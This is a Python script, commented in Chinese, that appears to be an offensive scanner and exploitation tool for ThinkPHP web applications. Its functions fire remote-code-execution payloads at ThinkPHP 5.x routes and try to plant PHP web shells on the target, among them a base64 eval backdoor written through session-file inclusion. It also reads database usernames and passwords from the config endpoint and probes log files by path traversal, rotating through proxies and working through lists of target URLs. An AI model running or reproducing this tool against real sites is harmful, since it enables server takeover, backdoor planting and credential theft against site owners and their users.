# coding:utf-8

import requests
from urllib import parse
import urllib3
import base64
import argparse
import time
import random
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# requests.packages.urllib3.disable_warnings()

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close'}

def proxy_get(host, proxy):
    if proxy:
        proxies = random.choice(proxy)
        proxies_use = {"http": "http://{}".format(proxies.strip('\n')), "https": "https://{}".format(proxies.strip('\n'))}
        try:
            res = requests.get(url=host, headers=headers, verify=False, proxies=proxies_use, timeout=5)
            res.encoding = 'utf-8'
            if res.status_code == 500 and 'ThinkPHP' in res.text:
                sta_code = 200
            else:
                sta_code = res.status_code
        except:
            sta_code = 100
        while sta_code != 200: 
            proxy.remove(proxies)
            if proxy:
                proxies = random.choice(proxy)
                proxies_use = {"http": "http://{}".format(proxies.strip('\n')), "https": "https://{}".format(proxies.strip('\n'))}
                try:
                    res = requests.get(url=host, headers=headers, verify=False, allow_redirects=False, proxies=proxies_use, timeout=5)
                    sta_code = res.status_code
                except:
                    pass
            else:
                print('没有代理可用了')
                sys.exit(0)
    else:
        proxy = False
        proxies_use = []
    return proxies_use, proxy

def req_get(url, proxy):
    res_body = ''
    if proxy:
        try:
            res = requests.get(url=url, headers=headers, verify=False, allow_redirects=False, proxies=proxy, timeout=5)
            res.encoding = 'utf-8'
            # res_body = res.text
        except:
            print("\033[1;31m网络出错！\033[0m")
            pass
    else:
        try:
            res = requests.get(url=url, headers=headers, verify=False, allow_redirects=False, timeout=5)
            res.encoding = 'utf-8'
            # res_body = res.text
        except:
            print("\033[1;31m网络出错！\033[0m")
            pass
    return res

def req_post(url, proxy, data):
    res_body = ''
    if proxy:
        try:
            res = requests.post(url=url, headers=headers, verify=False, data=data, allow_redirects=False, proxies=proxy, timeout=5)
            res.encoding = 'utf-8'
        except:
            print("\033[1;31m网络出错！\033[0m")
            pass
    else:
        try:
            res = requests.post(url=url, headers=headers, verify=False, data=data, allow_redirects=False, timeout=5)
            res.encoding = 'utf-8'
        except:
            print("\033[1;31m网络出错！\033[0m")
            pass
    return res

def think_rce_check(host, proxy):
    print('\033[1;34m[!] thinkphp_RCE探测：\033[0m')
    # 5.0.x命令执行，<=5.0.24
    success = []
    headers["Host"] = parse.urlparse(host).hostname
    payloads = [r"/?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
                r"/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()",
                r"/?s=index/think\request/input?data[]=phpinfo()&filter=assert",
                r"/?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>",
                r"/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()",
                r"/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
                r"/?s=index/\think\Request/input&filter[]=phpinfo&data=-1",
                r"/?s=index/\think\module/action/param1/${@phpinfo()}"]
    for i in payloads:
        url1 = host + i
        proxies, proxy = proxy_get(host, proxy)
        res_body_1 = req_get(url1, proxies)
        if ('PHP Version' in res_body_1.text) or ('PHP Extension Build' in res_body_1.text):
            success.append(url1)
        else:
            pass

    # ThinkPHP <= 5.0.23 需要存在xxx的method路由，例如captcha
    url2 = host + "/?s=captcha&test=-1"
    post_2 = [r'_method=__construct&filter=phpinfo&method=get&server[REQUEST_METHOD]=1',
            r'_method=__construct&filter[]=phpinfo&method=GET&get[]=1']
    query_2 = '/?s=captcha&test=-1'
    for j in post_2:
        proxies, proxy = proxy_get(host, proxy)
        res_body_2 = req_post(url2, proxies, j)
        if ('PHP Version' in res_body_2.text) or ('PHP Extension Build' in res_body_2.text):
            payload_post2 = url2 + "  POST: " + j
            success.append(payload_post2)
        else:
            pass

    url3 = host + "/?s=captcha&test=phpinfo()"
    post_3 = r'_method=__construct&filter[]=assert&method=get&server[REQUEST_METHOD]=-1'
    proxies, proxy = proxy_get(host, proxy)
    res_body_3 = req_post(url3, proxies, post_3)
    if ('PHP Version' in res_body_3.text) or ('PHP Extension Build' in res_body_3.text):
        payload_post3 = url3 + "  POST: " + post_3
        success.append(payload_post3)
    else:
        pass

    # ThinkPHP <= 5.0.13
    url4 = host + "/?s=index/index/"
    post_4 = [r's=-1&_method=__construct&method=get&filter[]=phpinfo',
              r'_method=__construct&method=get&filter[]=phpinfo&get[]=-1']
    for k in post_4:
        proxies, proxy = proxy_get(host, proxy)
        res_body_4 = req_post(url4, proxies, k)
        if ('PHP Version' in res_body_4.text) or ('PHP Extension Build' in res_body_4.text):
            payload_post4 = url4 + "  POST: " + k
            success.append(payload_post4)
        else:
            pass

    # ThinkPHP <= 5.0.23、5.1.0 <= 5.1.16 需要开启框架app_debug
    url5 = host
    post_5 = [r'_method=__construct&filter[]=phpinfo&server[REQUEST_METHOD]=-1']
    for h in post_5:
        proxies, proxy = proxy_get(host, proxy)
        res_body_5 = req_post(url5, proxies, h)
        if ('PHP Version' in res_body_5.text) or ('PHP Extension Build' in res_body_5.text):
            payload_post5 = url5 + "  POST: " + h
            success.append(payload_post5)
        else:
            pass

    if success:
        print("\033[1;34m[!] 存在thinkphp_RCE! 可用Payload:\033[0m")
        for p in success:
            print("\033[1;32m{}\033[0m".format(p))
            fo = open('{}.txt'.format(parse.urlparse(host).hostname), 'a')
            fo.write(p + '\n')
            fo.close()
    else:
        print("\033[1;31m[!] 不存在thinkphp_RCE!\033[0m")


def getshell(host,proxy):
    fo = open('{}.txt'.format(parse.urlparse(host).hostname), 'a')
    print("\033[1;34m[!]正在尝试Getshell：\033[0m")
    headers["Host"] = parse.urlparse(host).hostname
    success = False
    shell = "<?php phpinfo();?>"
    shell_url = host + "/1ndex.php"
    payload = [
        r"/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][]=" + shell,
        r"/?s=index/\think\template\driver\file/write&cacheFile=1ndex.php&content=" + shell,
        ]
    for k in payload:
        url = host + k
        proxies, proxy = proxy_get(host, proxy)
        req_get(url, proxies)
        getshell_res = req_get(shell_url, proxies)
        if getshell_res.status_code == 200:
            print("\033[1;32m[+] Getshell succeed，shell address： " + host + "/1ndex.php\n\033[0m")
            fo.write('Getshell succeed，shell address： {}/1ndex.php'.format(host))
            success = True
            break
        else:
            pass

    if not success:
        # ThinkPHP <= 5.0.23 需要存在xxx的method路由，例如captcha
        post_payload2 = r'_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=-1'
        # try:
        proxies, proxy = proxy_get(host, proxy)
        url2 = host + '/?s=captcha&test=echo+\'"{}"\'+>>1ndex.php'.format(shell)
        req_post(url2, proxies, post_payload2)
        getshell_res2 = req_get(shell_url, proxies)
        if getshell_res2.status_code == 200:
            print("\033[1;32m[+] Getshell succeed，shell address： " + host + "/1ndex.php\n\033[0m")
            fo.write('Getshell succeed，shell address： {}/1ndex.php\n'.format(host))
            success = True
        else:
            pass

    if not success:
        # ThinkPHP <= 5.0.13
        post_payload3 = [r's=echo+ "{}" +>>1ndex.php&_method=__construct&method=&filter[]=system'.format(shell),
                         r'_method=__construct&filter[]=system&mytest=echo+ "{}" +>>1ndex.php'.format(shell)]
        for h in post_payload3:
        # try:
            proxies, proxy = proxy_get(host, proxy)
            url3 = host + "/?s=index/index"
            req_post(url3,proxies, h)
            getshell_res3 = req_get(shell_url, proxies)
            if getshell_res3.status_code == 200:
                print("\033[1;32m[+] Getshell succeed，shell address： " + host + "/1ndex.php\n\033[0m")
                fo.write('Getshell succeed，shell address： {}/1ndex.php\n'.format(host))
                success = True
                break
            else:
                pass

    if not success:
        # 参考链接：https://www.cnblogs.com/r00tuser/p/11410157.html
        sess = "hahahatest"
        headers.update({"Cookie": "PHPSESSID={}".format(sess)})
        sess_dir = 'php://filter/read=convert.base64-decode/resource=/tmp/sess_{}'.format(sess).encode(encoding="utf-8")
        base64_ = base64.b64encode(sess_dir).decode()
        post_payload4 = r'_method=__construct&filter[]=think\Session::set&method=get&get[]=abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab&server[]=1'
        post_res = r'_method=__construct&filter[]=base64_decode&filter[]=think\__include_file&method=get&server[]=1&get[]={}'.format(
            base64_)
        proxies, proxy = proxy_get(host, proxy)
        url4 = host + "/?s=captcha&test=1"
        req_post(url4, proxies,post_payload4)
        shell_add_4 = host + "/?s=captcha&r=cGhwaW5mbygpOw=="
        getshell_res4 = req_post(shell_add_4, proxies,post_res)
        if ('PHP Version' in getshell_res4.text) or ('PHP Extension Build' in getshell_res4.text):
            print(
                "\033[1;32m[+] Getshell success, You can use POST " + host + "/?s=captcha&r=cGhwaW5mbygpOw==\n\033[0m" + "\033[1;32m[=]  _method=__construct&filter[]=base64_decode&filter[]=think\__include_file&method=get&server[]=1&get[]={}\033[0m".format(
                    base64_))
            print("\033[1;32m[+] r 参数是命令的base64编码\n\033[0m")
            fo.write('Getshell succeed，shell address： {}/?s=captcha&r=cGhwaW5mbygpOw==\n'.format(host))
            fo.write('r 参数是命令的base64编码\n')
            success = True
        else:
            pass


    if not success:
        post_payload5 = r'_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]={}<?php md5("test");?>'.format(
            shell)
        time_dir = time.strftime("%Y%m/%d", time.localtime())
        try:
            proxies, proxy = proxy_get(host, proxy)
            url5 = host + "/?s=captcha"
            req_post(url5,proxies,post_payload5)
            dir_ = "/../../runtime/log/{}.log".format(time_dir)
            shell_url_5 = host + "/?s=index/\\think\Lang/load&file=" + dir_
            getshell_res5 = req_get(shell_url_5, proxies)
            if ("098f6bcd4621d373cade4e832627b4f6" in getshell_res5.text):
                print('\033[1;32m[+] Getshell success: ' + shell_url_5 + "\n\033[0m")
                fo.write('Getshell success: {}\n'.format(shell_url_5))
                success = True
            else:
                pass
        except:
            pass
    if not success:
        print("\033[1;31m[!]Getshell失败！\033[0m")
    fo.close()
    return success


def get_mysql_conf(host):
    fo = open('{}.txt'.format(parse.urlparse(host).hostname), 'a')
    headers["Host"] = parse.urlparse(host).hostname
    print("\033[1;34m[!] 尝试获取数据库配置:\033[0m")
    mysql_success = False
    try:
        name = requests.get(url=host + "/?s=index/think\config/get&name=database.username", headers=headers, timeout=5,
                            verify=False, allow_redirects=False)
        hostname = requests.get(url=host + "/?s=index/think\config/get&name=database.hostname", headers=headers,
                                timeout=5,
                                verify=False, allow_redirects=False)
        password = requests.get(url=host + "/?s=index/think\config/get&name=database.password", headers=headers,
                                timeout=5,
                                verify=False, allow_redirects=False)
        database = requests.get(url=host + "/?s=index/think\config/get&name=database.database", headers=headers,
                                timeout=5,
                                verify=False, allow_redirects=False)
        if len(name.text) >0 and len(name.text)< 100:
            fo.write('database username: {}\n'.format(name.text))
            print("\033[1;32m[+] database username: \033[0m" + name.text)
            mysql_success = True
        if len(hostname.text) >0 and len(hostname.text)< 100:
            fo.write('database hostname: {}\n'.format(hostname.text))
            print("\033[1;32m[+] database hostname: \033[0m" + hostname.text)
        if len(password.text) >0 and len(password.text)< 100:
            fo.write('database password: {}\n'.format(password.text))
            print("\033[1;32m[+] database password: \033[0m" + password.text)
        if len(database.text) >0 and len(database.text)< 100:
            fo.write('database name: {}\n'.format(database.text))
            print("\033[1;32m[+] database name: \033[0m" + database.text)
        if not mysql_success:
            print("\033[1;31m[!] 数据库配置获取失败\033[0m")
    except:
        pass
    fo.close()

def log_find(host):
    fo = open('{}.txt'.format(parse.urlparse(host).hostname), 'a')
    headers["Host"] = parse.urlparse(host).hostname
    print('\033[1;34m[!] 日志文件路径探测：\033[0m')
    time_dir_5 = time.strftime("%Y%m/%d", time.localtime())
    # thinkphp 5 主日志 info
    log_dir_info_5 = host + "/../../runtime/log/{}.log".format(time_dir_5)
    # 错误日志 error
    log_dir_error_5 = host + "/../../runtime/log/{}_error.log".format(time_dir_5)
    # sql日志 sql
    log_dir_sql_5 = host + "/../../runtime/log/{}_sql.log".format(time_dir_5)
    try:
        info_res = requests.get(url=log_dir_info_5, headers=headers, timeout=5, verify=False, allow_redirects=False)
        error_res = requests.get(url=log_dir_error_5, headers=headers, timeout=5, verify=False, allow_redirects=False)
        sql_res = requests.get(url=log_dir_sql_5, headers=headers, timeout=5, verify=False, allow_redirects=False)
        if info_res.status_code == 200 and (
                ("[ info ]" in info_res.text) or ("[ sql ]" in info_res.text) or ("[ error ]" in info_res.text)):
            fo.write('info日志存在: {}\n'.format(log_dir_info_5))
            print("\033[1;32m[+] info日志存在: \033[0m" + log_dir_info_5)
        if error_res.status_code == 200 and (
                ("[ info ]" in error_res.text) or ("[ sql ]" in error_res.text) or ("[ error ]" in error_res.text)):
            fo.write('error日志存在: {}\n'.format(log_dir_error_5))
            print("\033[1;32m[+] error日志存在: \033[0m" + log_dir_error_5)
        if sql_res.status_code == 200 and (
                ("[ info ]" in sql_res.text) or ("[ sql ]" in sql_res.text) or ("[ error ]" in sql_res.text)):
            fo.write('sql日志存在: {}\n'.format(log_dir_sql_5))
            print("\033[1;32m[+] sql日志存在: \033[0m" + log_dir_sql_5)
    except:
        print("\033[1;31m网络出错！\033[0m")

    # thinkphp 3 日志
    time_dir_3 = time.strftime("%y_%m_%d", time.localtime())
    log_dir_3_1 = host + "/Application/Runtime/Logs/Home/{}.log".format(time_dir_3)
    log_dir_3_2 = host + "/Runtime/Logs/Home/{}.log".format(time_dir_3)
    log_dir_3_3 = host + "/Runtime/Logs/Common/{}.log".format(time_dir_3)
    log_dir_3_4 = host + "/Application/Runtime/Logs/Common/{}.log".format(time_dir_3)
    log_dir_3_5 = host + "/App/Runtime/Logs/Home/{}.log".format(time_dir_3)
    log_dir_3 = [log_dir_3_1, log_dir_3_2, log_dir_3_3, log_dir_3_4, log_dir_3_5]
    for i in log_dir_3:
        try:
            log_3_res = requests.get(url=i, headers=headers, timeout=5, verify=False, allow_redirects=False)
            log_3_res.encoding = 'utf-8'
            if log_3_res.status_code == 200 and (("INFO:" in log_3_res.text) or ("SQL语句" in log_3_res.text) or ("ERR:" in log_3_res.text)):
                fo.write('日志存在: {}\n'.format(i))
                print("\033[1;32m[+] 日志存在: \033[0m" + i)
            else:
                pass
        except:
            print("\033[1;31m网络出错！\033[0m")
    fo.close()

def check_dubug(host):
    fo = open('{}.txt'.format(parse.urlparse(host).hostname), 'a')
    headers["Host"] = parse.urlparse(host).hostname
    div_html_5 = ''
    div_html_3 = ''
    print("\033[1;34m[+] 检测Debug模式是否开启: \033[0m")
    debug_bool = False
    url_debug = ["indx.php", "/index.php/?s=index/inex/"]
    for i in url_debug:
        try:
            res_debug = requests.get(url=host + i, headers=headers, timeout=5, verify=False, allow_redirects=False)
            res_debug.encoding = 'utf-8'
            if ("Environment Variables" in res_debug.text) or ("错误位置" in res_debug.text):
                print("\033[1;32m[+] Debug 模式已开启！\033[0m")
                debug_bool = True
                res_debug_html = BeautifulSoup(res_debug.text, 'html.parser')
                div_html_5 = res_debug_html.findAll('div', {'class': 'clearfix'})
                div_html_3 = res_debug_html.find('sup')
                div_html_3_path = res_debug_html('div', {'class': 'text'})
                break
        except:
            print("\033[1;31m[+] 检测出错\033[0m")
    if debug_bool == False:
        print("\033[1;31m[+] Debug 模式未开启！\033[0m")
    if debug_bool:
        if div_html_5:
            for j in div_html_5:
                if j.strong.text == 'THINK_VERSION':
                    fo.write('ThinkPHP Version: {}\n'.format(j.small.text.strip()))
                    print("\033[1;32m[+] ThinkPHP Version: {}\033[0m".format(j.small.text.strip()))
                if j.strong.text == 'DOCUMENT_ROOT':
                    fo.write('DOCUMENT ROOT: {}\n'.format(j.small.text.strip()))
                    print("\033[1;32m[+] DOCUMENT ROOT: {}\033[0m".format(j.small.text.strip()))
                if j.strong.text == 'SERVER_ADDR':
                    fo.write('SERVER ADDR: {}\n'.format(j.small.text.strip()))
                    print("\033[1;32m[+] SERVER ADDR: {}\033[0m".format(j.small.text.strip()))
                if j.strong.text == 'LOG_PATH':
                    fo.write('LOG PATH: {}\n'.format(j.small.text.strip()))
                    print("\033[1;32m[+] LOG PATH: {}\033[0m".format(j.small.text.strip()))
        elif div_html_3 and div_html_3_path:
            fo.write('ThinkPHP Version: {}\n'.format(div_html_3.text))
            fo.write('ThinkPHP Path: {}\n'.format(div_html_3_path[0].p.text))
            print("\033[1;32m[+] ThinkPHP Version: {}\033[0m".format(div_html_3.text))
            print("\033[1;32m[+] ThinkPHP Path: {}\033[0m".format(div_html_3_path[0].p.text))
    fo.close()


def check_host(host):
    if not host.startswith("http"):
        print('\033[1;31m[x] ERROR: Host "{}" should start with http or https\n\033[0m'.format(host))
        return False
    else:
        return True


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Thinkphp Scan')
    parser.add_argument(
        "-u", "--url", help='Start scanning url -u xxx.com')
    parser.add_argument("-f", "--file", help='read the url from the file')
    parser.add_argument("-p", "--proxy", help='use HTTP/HTTPS proxy')
    parser.add_argument("--shell", help='try to get shell', action='store_true')
    args = parser.parse_args()
    if args.url and check_host(args.url):
        if args.proxy:
            fo = open(args.proxy,'r')
            proxy = fo.readlines()
            fo.close()
        else:
            proxy = False
        print("\033[1;34m[!][!][!] {} Start\033[0m".format(args.url))
        log_find(args.url)
        check_dubug(args.url)
        try:
            think_rce_check(args.url, proxy)
        except:
            pass
        get_mysql_conf(args.url)
        if args.shell:
            getshell(args.url, proxy)
    if args.file:
        f = open(args.file, "r")
        host = f.readlines()
        count = 0
        for i in host:
            if args.proxy:
                fo = open('proxy.txt','r')
                proxy = fo.readlines()
                fo.close()
            else:
                proxy = False
            url = i.strip('\n')
            print("\033[1;34m[!][!][!] {} Start\033[0m".format(url))
            if check_host(url):
                log_find(url)
                check_dubug(url)
                try:
                    think_rce_check(url, proxy)
                except:
                    pass
                get_mysql_conf(url)
                if args.shell:
                    getshell(url,proxy)
            count = count +1
            print("进度:{0}%".format(round(count * 100 / len(host))), end='\r')
            time.sleep(0.2)